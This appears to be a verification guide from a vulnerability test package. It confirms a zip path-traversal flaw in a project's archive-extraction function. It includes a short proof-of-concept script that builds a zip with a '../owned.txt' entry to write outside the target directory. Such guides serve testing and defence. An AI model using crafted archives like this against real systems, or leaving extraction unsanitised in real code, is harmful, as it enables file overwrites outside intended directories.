
# Verification Guide

## CWE-26: Path Traversal - filenames in archive extraction

**CWE ID:** CWE-26

**Location:** `extract_archive` function in `src/app.py` (lines ~22-36)

**Issue:** 
When extracting zip archives, the code takes file names inside the archive at face value and writes them directly to the filesystem without sanitizing against `../` sequences. This allows extraction of files outside the intended directory.

---

## Verification Steps

1. **Set up the project:**

    ```sh
    cd projects/FileArchive/src
    mkdir testfiles
    echo "malicious content" > testfiles/evil.txt
    ```

2. **Create a malicious zip with a path traversal filename:**

    ```python
    # Save the following script as makeevilzip.py:
    import zipfile
    with zipfile.ZipFile("evil.zip", "w") as zf:
        zf.writestr("../owned.txt", "You have been hacked!")
    ```

    Then run:
    ```
    python makeevilzip.py
    ```

3. **Move the zip to the archives folder:**

    ```sh
    mv evil.zip ../archives/
    ```

4. **Extract using the vulnerable utility:**
   
    ```sh
    python app.py extract evil.zip test
    ```

5. **Observe the result:**

    - The file `owned.txt` should have been written into the parent directory of `src/extracted/test/`, i.e., potentially outside the controlled extraction destination.
    - Check for the file:
      ```sh
      ls ../owned.txt
      cat ../owned.txt
      ```

**If you see "You have been hacked!" in `../owned.txt`, the vulnerability is confirmed.**
